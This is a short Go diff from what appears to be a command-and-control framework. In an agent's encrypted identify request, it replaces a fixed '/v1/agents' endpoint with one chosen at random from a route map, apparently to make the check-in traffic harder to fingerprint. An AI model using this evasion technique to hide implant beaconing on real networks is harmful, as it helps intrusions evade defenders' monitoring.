@@ -33,7 +33,9 @@ func Identify(hostname, os, arch, pubKeyPEM string, decryptionKey *rsa.PrivateKe
 		return "", err
 	}
 
-	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/v1/agents", bytes.NewBuffer([]byte(encrypted)))
+	endpointPaths := RouteMap[R_AGENT_IDENTIFY]
+	endpointPath := randElem(&endpointPaths)
+	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/"+endpointPath, bytes.NewBuffer([]byte(encrypted)))
 	if err != nil {
 		return "", err
 	}
